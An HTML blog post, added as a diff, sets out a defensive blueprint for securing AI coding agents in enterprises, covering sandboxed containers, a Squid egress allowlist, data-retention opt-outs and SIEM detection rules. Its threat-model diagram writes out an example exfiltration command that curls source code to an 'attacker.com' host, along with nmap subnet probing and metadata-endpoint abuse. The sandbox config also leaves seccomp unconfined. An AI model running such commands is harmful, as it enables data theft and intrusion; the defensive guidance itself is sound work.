@@ -1,0 +1,379 @@
+<!doctype html>
+<html lang="en-AU">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Securing AI Code Generation in Enterprise Environments: Hard Guardrails, Sandboxing, and Zero Data Retention | Global SOC</title>
+<link rel="canonical" href="https://globalsoc.com.au/blog/securing-ai-code-generation-enterprise/">
+<meta name="description" content="Enterprise technical blueprint for securing AI-assisted code generation (OpenAI Codex, Copilot, agentic workflows) with container sandboxing, Squid egress allowlisting, Zero Data Retention (ZDR), Azure Private Endpoints, pre-commit DLP, and SOC SIEM detections.">
+<meta name="author" content="Yogesh">
+<meta property="og:site_name" content="Global SOC">
+<meta property="og:locale" content="en_AU">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://globalsoc.com.au/blog/securing-ai-code-generation-enterprise/">
+<meta property="og:title" content="Securing AI Code Generation in Enterprise Environments: Hard Guardrails, Sandboxing, and Zero Data Retention">
+<meta property="og:description" content="Technical blueprint and hardening configurations to deploy AI code generation within a corporate network behind zero-trust guardrails, strict execution sandboxing, and guaranteed data training opt-outs.">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Securing AI Code Generation in Enterprise Environments | Global SOC">
+<meta name="twitter:description" content="Technical blueprint and hardening configurations to deploy AI code generation within a corporate network behind zero-trust guardrails, strict execution sandboxing, and guaranteed data training opt-outs.">
+<meta property="article:published_time" content="2026-11-05">
+<meta property="article:modified_time" content="2026-11-05">
+<script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "BlogPosting",
+      "@id": "https://globalsoc.com.au/blog/securing-ai-code-generation-enterprise/#article",
+      "url": "https://globalsoc.com.au/blog/securing-ai-code-generation-enterprise/",
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://globalsoc.com.au/blog/securing-ai-code-generation-enterprise/"
+      },
+      "headline": "Securing AI Code Generation in Enterprise Environments: Hard Guardrails, Sandboxing, and Zero Data Retention",
+      "description": "Technical blueprint and hardening configurations to deploy AI code generation within a corporate network behind zero-trust guardrails, strict execution sandboxing, and guaranteed data training opt-outs.",
+      "datePublished": "2026-11-05",
+      "dateModified": "2026-11-05",
+      "author": {
+        "@type": "Person",
+        "name": "Yogesh"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "@id": "https://globalsoc.com.au/#organization",
+        "name": "Global SOC",
+        "legalName": "Global SOC Pty Ltd",
+        "url": "https://globalsoc.com.au/"
+      },
+      "isPartOf": {
+        "@id": "https://globalsoc.com.au/blog/#blog"
+      },
+      "inLanguage": "en-AU"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://globalsoc.com.au/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Blog",
+          "item": "https://globalsoc.com.au/blog/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "Securing AI Code Generation in Enterprise Environments",
+          "item": "https://globalsoc.com.au/blog/securing-ai-code-generation-enterprise/"
+        }
+      ]
+    }
+  ]
+}</script>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&amp;family=JetBrains+Mono:wght@400;600&amp;display=swap" rel="stylesheet">
+<style>
+:root{--bg:#f6f7f9;--card:#fff;--ink:#101a24;--muted:#5d6b78;--line:#e2e7ec;--brand:#0e4d6e;--accent:#e9771a;--soft:#e6f0f6;--code:#0d1b24;--codeink:#d7e6ee;--pass:#1f8a5b;--warn:#b7700a;--fail:#c8372d;--info:#4b6a88}
+@media (prefers-color-scheme:dark){:root{--bg:#0b1015;--card:#151e27;--ink:#e9eff4;--muted:#95a3af;--line:#25303a;--brand:#5fb3dd;--accent:#ffa04a;--soft:#13293a;--code:#081118;--pass:#3ccf8e;--warn:#f0b03c;--fail:#ff6b5e;--info:#8fb0cf;color-scheme:dark}}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;scroll-padding-top:82px}
+body{background:var(--bg);color:var(--ink);font-family:Inter,system-ui,sans-serif;line-height:1.7;-webkit-font-smoothing:antialiased}
+a{color:var(--brand)}
+a:focus-visible{outline:3px solid var(--accent);outline-offset:4px}
+.wrap{max-width:760px;margin:0 auto;padding:0 18px}
+header.top{position:sticky;top:0;z-index:10;background:color-mix(in srgb,var(--bg) 88%,transparent);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+header.top .wrap{max-width:1120px;display:flex;justify-content:space-between;align-items:center;height:60px}
+.logo{font-weight:800;text-decoration:none;color:var(--ink);letter-spacing:-.01em}
+.logo small{color:var(--muted);font-weight:600;margin-left:6px}
+header.top nav a{text-decoration:none;color:var(--muted);font-weight:600;font-size:14px;margin-left:18px}
+.hero{background:linear-gradient(135deg,#06222c,#0e4d6e 55%,#120c2a);color:#fff;padding:56px 0 46px}
+.tag{display:inline-block;background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.2);border-radius:99px;padding:4px 12px;font-size:12.5px;font-weight:600;letter-spacing:.03em}
+.hero h1{font-size:clamp(30px,5.4vw,44px);line-height:1.14;letter-spacing:-.025em;margin:16px 0 14px}
+.hero p.lede{font-size:18px;opacity:.9;max-width:650px}
+.audience{margin-top:16px;font-size:13.5px;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.16);border-radius:12px;padding:10px 14px;display:inline-block}
+.by{display:flex;align-items:center;gap:12px;margin-top:24px;font-size:14px}
+.av{width:42px;height:42px;border-radius:50%;background:linear-gradient(135deg,#e9771a,#ffb35c);display:grid;place-items:center;font-weight:800;color:#2a1300;font-size:18px}
+.by b{display:block}.by span{opacity:.75}
+article{padding:40px 0 20px;overflow-wrap:anywhere}
+article h2{font-size:26px;letter-spacing:-.02em;line-height:1.25;margin:44px 0 12px;scroll-margin-top:82px}
+article h3{font-size:19px;margin:30px 0 8px;scroll-margin-top:82px}
+article p{margin:0 0 16px}
+article ul,article ol{margin:0 0 16px 22px}
+article li{margin:6px 0}
+.toc{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px 22px;margin:0 0 24px}
+.toc b{font-size:13px;text-transform:uppercase;letter-spacing:.06em;color:var(--muted)}
+.toc ol{margin:8px 0 0 20px}
+.tw{overflow-x:auto;margin:18px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden}
+th,td{text-align:left;vertical-align:top;padding:12px 14px;border-bottom:1px solid var(--line)}
+th{font-size:12.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:12.5px;word-break:break-word}
+code{font-family:'JetBrains Mono',ui-monospace,monospace;font-size:.88em;background:var(--soft);padding:2px 6px;border-radius:6px}
+pre{position:relative;background:var(--code);color:var(--codeink);border-radius:14px;padding:18px;overflow-x:auto;font:13.5px/1.6 'JetBrains Mono',ui-monospace,monospace;margin:14px 0 20px;overflow-wrap:normal;max-width:100%}
+pre code{background:none;padding:0;font-size:inherit;color:inherit}
+.copy{position:absolute;top:10px;right:10px;background:rgba(255,255,255,.1);color:#d7e6ee;border:1px solid rgba(255,255,255,.18);border-radius:8px;font:600 12px Inter,sans-serif;padding:5px 10px;cursor:pointer}
+.callout{border-left:5px solid var(--accent);background:var(--card);border-radius:12px;padding:16px 18px;margin:20px 0}
+.callout.key{border-color:var(--brand)}
+.callout.warn{border-color:var(--fail)}
+.callout b:first-child{display:block;margin-bottom:4px}
+.callout p:last-child{margin-bottom:0}
+.pill{display:inline-block;font-size:12px;font-weight:700;padding:2px 10px;border-radius:99px;border:1px solid currentColor;white-space:nowrap}
+.f{color:var(--fail)}.w{color:var(--warn)}.p{color:var(--pass)}.i{color:var(--info)}
+.checklist{list-style:none;margin-left:0}
+.checklist li{position:relative;padding-left:28px;margin:10px 0}
+.checklist li::before{content:"✓";position:absolute;left:0;top:1px;width:20px;height:20px;border-radius:50%;background:var(--soft);color:var(--pass);font-weight:800;font-size:12px;display:grid;place-items:center}
+.cta{margin:46px 0 10px;background:linear-gradient(135deg,#0b3b4a,#12806f);color:#fff;border-radius:20px;padding:26px}
+.cta h3{margin:0 0 6px;font-size:21px}.cta p{opacity:.88;margin:0 0 14px}
+.cta a{display:inline-block;background:#fff;color:#0b3b4a;text-decoration:none;font-weight:700;padding:11px 18px;border-radius:12px;margin:4px 8px 0 0}
+.related{margin-top:24px;font-size:14.5px}
+.author{display:flex;gap:14px;align-items:center;border-top:1px solid var(--line);margin-top:36px;padding-top:22px;font-size:14.5px;color:var(--muted)}
+.author .av{flex:none}
+footer{border-top:1px solid var(--line);padding:22px 0;color:var(--muted);font-size:13.5px;margin-top:30px}
+footer .wrap{max-width:1120px;display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap}
+@media (max-width:600px){header.top nav a.hide{display:none}article h2{font-size:23px}}
+</style>
+</head>
+<body>
+<header class="top"><div class="wrap"><a class="logo" href="/">Global SOC<small>Blog</small></a><nav aria-label="Main navigation"><a href="/blog/">All posts</a><a class="hide" href="/cybersecurity/">Cybersecurity</a><a class="hide" href="/dnsaudit/">DNS Audit</a><a href="/#contact">Contact</a></nav></div></header>
+
+<section class="hero"><div class="wrap">
+  <span class="tag">ENTERPRISE AI SECURITY · ARCHITECTURE BLUEPRINT</span>
+  <h1>Securing AI Code Generation in Enterprise Environments: Hard Guardrails, Sandboxing, and Zero Data Retention</h1>
+  <p class="lede">The technical blueprint and hardening configurations required to deploy AI code generation within a corporate network behind zero-trust guardrails, strict execution sandboxing, and guaranteed data training opt-outs.</p>
+  <div class="audience"><strong>Target Audience:</strong> Chief Information Security Officers (CISOs), SOC Leads, Cloud Security Architects, and DevSecOps Engineers</div>
+  <div class="by"><div class="av" aria-hidden="true">Y</div><div><b>Yogesh · Global SOC</b><span><time datetime="2026-11-05">5 Nov 2026</time> · 10 min read · globalsoc.com.au</span></div></div>
+</div></section>
+
+<main class="wrap"><article>
+<nav class="toc" aria-label="Table of contents"><b>In this blueprint</b><ol>
+<li><a href="#executive-summary">Executive Summary</a></li>
+<li><a href="#threat-model">Threat Model: What Can Go Wrong?</a></li>
+<li><a href="#network-lockdown">1. Network Lockdown &amp; Sandbox Architecture</a></li>
+<li><a href="#preventing-model-training">2. Preventing Model Training on Corporate Code</a></li>
+<li><a href="#client-side-dlp">3. Client-Side Pre-Commit DLP (Data Loss Prevention) Guardrail</a></li>
+<li><a href="#soc-monitoring">4. SOC Monitoring &amp; SIEM Detection Use Cases</a></li>
+<li><a href="#summary-checklist">Summary Checklist for CISOs &amp; SecOps</a></li>
+</ol></nav>
+
+<h2 id="executive-summary">Executive Summary</h2>
+<p>The pressure on engineering teams to adopt AI-assisted coding tools—such as OpenAI Codex, Copilot, and autonomous agentic workflows—has never been higher. However, from a Security Operations Center (SOC) and enterprise risk perspective, unconstrained AI code generation introduces two severe threat vectors:</p>
+<ul>
+<li><strong>Uncontrolled Code Execution &amp; Lateral Movement:</strong> Autonomous coding agents executing untrusted or hallucinated scripts that probe internal subnets, access metadata endpoints, or compromise internal corporate resources.</li>
+<li><strong>Intellectual Property Exfiltration &amp; Model Training Leaks:</strong> Sensitive proprietary source code, internal IP addresses, API secrets, and trade secrets inadvertently flowing into public LLM training datasets.</li>
+</ul>
+<p>This guide details the technical blueprint and hardening configurations required to deploy AI code generation within a corporate network behind zero-trust guardrails, strict execution sandboxing, and guaranteed data training opt-outs.</p>
+
+<h2 id="threat-model">Threat Model: What Can Go Wrong?</h2>
+<p>Before deploying guardrails, SOC teams must understand the attack paths inherent to local or agentic AI code tools:</p>
+<pre><code>[Developer Workstation / CI Runner]
+                 │
+                 ▼ (Generates &amp; executes untrusted shell commands / Python scripts)
+┌────────────────────────────────────────────────────────┐
+│ UNPROTECTED AGENT RUNTIME                              │
+├────────────────────────────────────────────────────────┤
+│ ❌ Lateral probing: nmap 10.0.0.0/8                    │
+│ ❌ Exfiltration: curl https://attacker.com -d @source  │
+│ ❌ Cloud metadata abuse: 169.254.169.254               │
+│ ❌ Corporate proxy bypass via dynamic socket bindings  │
+└────────────────────────────────────────────────────────┘</code></pre>
+<div class="callout warn"><b>Shared Credential Blast Radius</b><p>Without isolation, an agent running locally shares the developer’s Kerberos tokens, VPN routes, AWS credentials, and SSH keys.</p></div>
+
+<h2 id="network-lockdown">1. Network Lockdown &amp; Sandbox Architecture</h2>
+<p>To prevent generated code from executing actions across the corporate network or leaking data to unauthorized endpoints, you must enforce defense-in-depth sandboxing.</p>
+
+<h3>Layer 1: Container &amp; MicroVM Isolation (gVisor / Docker)</h3>
+<p>Code execution by an AI assistant must occur inside an ephemeral sandbox with:</p>
+<ul>
+<li>No host network access (<code>--network none</code> or isolated bridge).</li>
+<li>Read-only root filesystem.</li>
+<li>Dropped Linux capabilities (<code>CAP_SYS_ADMIN</code>, <code>CAP_NET_RAW</code> removed).</li>
+<li>Non-root execution and blocked privilege escalation.</li>
+</ul>
+
+<p><strong>Hardened Container Execution Specification (<code>docker-compose.sandbox.yml</code>)</strong></p>
+<pre><code>version: "3.8"
+services:
+  codex-execution-sandbox:
+    image: corporate-registry.internal/secops/sandbox-runtime:latest
+    container_name: codex_eval_sandbox
+    user: "10001:10001"               # Non-root user
+    read_only: true                   # Immutable root filesystem
+    security_opt:
+      - no-new-privileges:true        # Prevent setuid escalation
+      - seccomp:unconfined            # Use custom seccomp profile in production
+    cap_drop:
+      - ALL                           # Strip all Linux capabilities
+    network_mode: "none"              # HARD AIR-GAP: Zero network stack
+    tmpfs:
+      - /tmp:rw,noexec,nosuid,size=64m # Ephemeral memory-only scratchpad
+    pids_limit: 100                   # Prevent fork bombs
+    mem_limit: 1024m                  # Memory cap
+    cpus: 1.0
+    restart: "no"</code></pre>
+
+<div class="callout key"><b>Why <code>network_mode: "none"</code>?</b><p>Generated code frequently needs to perform file parsing, syntax checks, or unit tests. Setting <code>network_mode: "none"</code> ensures that even if the AI generates malicious exfiltration commands (e.g., <code>curl</code>, <code>nc</code>, <code>wget</code>, reverse shells), the kernel immediately rejects all socket creations.</p></div>
+
+<h3>Layer 2: Mediated Egress via Forward Proxy with Strict Allowlisting</h3>
+<p>If the AI runtime itself requires network egress solely to communicate with authorized model endpoints (e.g., OpenAI API or internal private gateways), enforce strict egress mediation via an enterprise proxy (e.g., Envoy or Squid) with TLS inspection.</p>
+
+<p><strong>Squid Egress Policy (<code>/etc/squid/squid.conf</code>)</strong></p>
+<pre><code># Define internal source subnet
+acl local_dev_subnet src 10.20.0.0/16
+
+# Define strict AI API destinations (SNI whitelisting)
+acl allowed_ai_domains dstdomain api.openai.com
+acl allowed_azure_openai dstdomain .openai.azure.com
+
+# Block standard private IP ranges (RFC 1918 &amp; Cloud Metadata)
+acl rfc1918_10 dst 10.0.0.0/8
+acl rfc1918_172 dst 172.16.0.0/12
+acl rfc1918_192 dst 192.168.0.0/16
+acl cloud_metadata dst 169.254.169.254/32
+
+# Enforcement rules
+http_access deny cloud_metadata
+http_access deny rfc1918_10
+http_access deny rfc1918_172
+http_access deny rfc1918_192
+http_access allow local_dev_subnet allowed_ai_domains
+http_access allow local_dev_subnet allowed_azure_openai
+http_access deny all</code></pre>
+
+<h2 id="preventing-model-training">2. Preventing Model Training on Corporate Code</h2>
+<p>A major enterprise compliance failure occurs when proprietary code, internal architecture comments, or credentials are used to continuously pre-train or fine-tune public LLMs.</p>
+<p>To achieve <strong>Zero Data Retention (ZDR)</strong> and disable data training, apply the following administrative and programmatic controls.</p>
+
+<h3>Direct OpenAI API &amp; Codex Configurations</h3>
+<h4>1. Contractual &amp; Workspace-Level Opt-Out</h4>
+<ul>
+<li><strong>API Default Terms:</strong> Data submitted via the official OpenAI API is not used to train models by default under OpenAI’s standard Commercial Terms. However, default retention persists for up to 30 days for abuse monitoring unless Zero Data Retention (ZDR) is formally approved.</li>
+<li><strong>ChatGPT Enterprise / Team Workspaces:</strong> Navigate to:<br>
+<code>Admin Settings ⟶ Data Controls ⟶ Turn OFF "Improve the model for everyone"</code></li>
+<li><strong>Zero Data Retention (ZDR) Request:</strong> Submit an enterprise ZDR request through OpenAI’s compliance portal to eliminate the 30-day monitoring buffer for mission-critical repositories.</li>
+</ul>
+
+<h4>2. Client-Side HTTP Headers &amp; SDK Policy</h4>
+<p>When orchestrating requests through SDKs or custom proxy shims, verify your organization ID and disable diagnostic storage where supported:</p>
+<pre><code>import os
+from openai import OpenAI
+
+# Force routing through internal egress proxy with corporate Org ID
+client = OpenAI(
+    api_key=os.environ.get("OPENAI_API_KEY"),
+    organization="org-corporateEnterpriseID",
+    base_url="https://ai-proxy.corp.internal/v1"  # Internal audit &amp; DLP gateway
+)
+
+response = client.chat.completions.create(
+    model="gpt-4o",  # or designated code-generation checkpoint
+    messages=[
+        {"role": "system", "content": "You are a secure code assistant. Adhere to OWASP Top 10."},
+        {"role": "user", "content": code_prompt}
+    ],
+    # Do not set store=True if using modern v1/chat completions
+    store=False
+)</code></pre>
+
+<h3>Recommended Enterprise Pattern: Azure OpenAI Service with Private Endpoints</h3>
+<p>For regulated industries (financial services, healthcare, defense, critical infrastructure), direct public API calls should be replaced with <strong>Azure OpenAI Private Endpoints</strong>:</p>
+<pre><code>[ Developer Machine ] ── (Private VNet / ExpressRoute) ──&gt; [ Azure Private Endpoint ]
+                                                                     │
+                                                                     ▼
+                                                           [ Azure OpenAI Resource ]
+                                                                     │
+                                                     (Zero Training Guarantee by Contract)</code></pre>
+<ul>
+<li><strong>No Customer Data Training:</strong> Microsoft contracts explicitly guarantee that prompt data, completions, and code embeddings are never shared with other customers, never used to train OpenAI foundation models, and never used to improve any Microsoft product.</li>
+<li><strong>Data Boundary:</strong> Customer data stays within your designated geographic boundary (e.g., <code>Australia East</code> for Australian residency compliance).</li>
+<li><strong>Private Link Integration:</strong> Completely disable the public internet gateway on the Cognitive Services resource:</li>
+</ul>
+<pre><code>az cognitiveservices account update \
+  --name "corp-openai-sec" \
+  --resource-group "rg-cybersecurity" \
+  --public-network-access Disabled</code></pre>
+
+<h2 id="client-side-dlp">3. Client-Side Pre-Commit DLP (Data Loss Prevention) Guardrail</h2>
+<p>Never rely exclusively on upstream LLM vendors to protect data. Enforce client-side sanitization on developer endpoints before prompts leave the workstation:</p>
+<pre><code>[Prompt Construction] ──&gt; [Secret &amp; PII Scanner] ──&gt; [Prompt Dispatched]
+                                   │
+                            (If secret found)
+                                   │
+                                   ▼
+                         [TERMINATE &amp; ALERT SOC]</code></pre>
+<p>Implement local pre-filtering using tools like <strong>TruffleHog</strong> or custom regex pre-processors to block:</p>
+<ul>
+<li>High-entropy tokens (AWS/GCP keys, private keys, JWTs).</li>
+<li>Internal domain nomenclature (<code>*.corp.internal</code>, internal IPv4 ranges).</li>
+<li>Personally Identifiable Information (PII) under local privacy regulations (e.g., Australian Privacy Principles / Privacy Act 1988).</li>
+</ul>
+
+<h2 id="soc-monitoring">4. SOC Monitoring &amp; SIEM Detection Use Cases</h2>
+<p>Your Security Operations Center should monitor and alert on AI-assisted coding activity using the following detection telemetry:</p>
+<div class="tw"><table>
+<thead>
+<tr>
+<th scope="col">Rule ID</th>
+<th scope="col">Detection Logic</th>
+<th scope="col">Severity</th>
+<th scope="col">Rationale</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>SOC-AI-001</code></td>
+<td>Egress connection attempt to <code>*.openai.com</code> bypassing corporate proxy</td>
+<td><span class="pill f">High</span></td>
+<td>Indicates developer attempting to bypass inspection with personal API key.</td>
+</tr>
+<tr>
+<td><code>SOC-AI-002</code></td>
+<td>Sandbox container attempting outbound SYN packet on port 80/443</td>
+<td><span class="pill w">Medium</span></td>
+<td>Indicates generated code attempting network discovery/exfiltration.</td>
+</tr>
+<tr>
+<td><code>SOC-AI-003</code></td>
+<td>Spikes in outbound token payload volume (&gt; 500 KB per transaction)</td>
+<td><span class="pill w">Medium</span></td>
+<td>Potential mass codebase exfiltration via prompt injection.</td>
+</tr>
+<tr>
+<td><code>SOC-AI-004</code></td>
+<td>Execution of <code>ptrace</code>, <code>bpf</code>, or raw socket system calls inside sandbox</td>
+<td><span class="pill f">Critical</span></td>
+<td>Potential container escape attempt by unverified AI code.</td>
+</tr>
+</tbody>
+</table></div>
+
+<h2 id="summary-checklist">Summary Checklist for CISOs &amp; SecOps</h2>
+<ul class="checklist">
+<li><strong>Execution Sandboxing:</strong> AI code runs in unprivileged, read-only containers with <code>network_mode: none</code>.</li>
+<li><strong>Network Egress Block:</strong> Direct connections to RFC 1918 subnets and <code>169.254.169.254</code> blocked by proxy.</li>
+<li><strong>Model Training Opt-Out:</strong> Enterprise contract executed; <code>store=False</code> enforced; workspace data-sharing toggles disabled.</li>
+<li><strong>Data Sovereignty:</strong> Migration to Private Endpoint deployments (e.g., Azure OpenAI in Australian data centers) where feasible.</li>
+<li><strong>SOC Visibility:</strong> Proxy logs, container lifecycle events, and DLP triggers ingested into SIEM.</li>
+</ul>
+
+<div class="cta">
+  <h3>Need assistance configuring AI guardrails, enterprise sandboxes, or SOC monitoring rules?</h3>
+  <p>Global SOC helps Australian security teams design zero-trust AI sandboxes, configure Azure Private Endpoints, and deploy SIEM detection engineering for AI workloads. Reach out to the team at <a href="https://globalsoc.com.au/" style="background:none;color:#fff;padding:0;margin:0;text-decoration:underline">globalsoc.com.au</a>.</p>
+  <a href="/#contact">Contact Global SOC</a>
+  <a href="/cybersecurity/">Explore Cybersecurity Services →</a>
+</div>
+
+<p class="related">Related reading: <a href="/blog/codex-corporate-network-guardrails/">Running Codex on a Corporate Network with Hard Guardrails</a> · <a href="/blog/ai-agent-email-prompt-injection/">Can an email hijack your AI assistant?</a></p>
+
+<div class="author"><div class="av" aria-hidden="true">Y</div><div><b style="color:var(--ink)">Yogesh · Global SOC</b><br>Practical cybersecurity architecture, SIEM detection engineering, and secure development guidance from Glen Waverley, Melbourne, Australia.</div></div>
+</article></main>
+
+<footer><div class="wrap"><span>© 2020–2026 Global SOC Pty Ltd · <a href="https://abr.business.gov.au/ABN/View?abn=46646550094" target="_blank" rel="noopener" style="color:inherit;text-decoration:underline dotted;text-underline-offset:3px">ABN 46 646 550 094</a> · Glen Waverley, Melbourne VIC</span><span><a href="/blog/">Blog</a> · <a href="/cybersecurity/">Cybersecurity</a> · <a href="/privacy.html">Privacy</a> · <a href="/">globalsoc.com.au</a></span></div></footer>
+<script>
+document.querySelectorAll('pre').forEach(p=>{const b=document.createElement('button');b.className='copy';b.textContent='Copy';b.onclick=()=>{const t=p.querySelector('code').innerText;(navigator.clipboard?navigator.clipboard.writeText(t):Promise.reject()).then(()=>{b.textContent='Copied';setTimeout(()=>b.textContent='Copy',1500)}).catch(()=>{b.textContent='Select & copy'})};p.appendChild(b)});
+</script>
+<script src="https://globalsoc.com.au/v.js" defer></script>
+</body>
+</html>
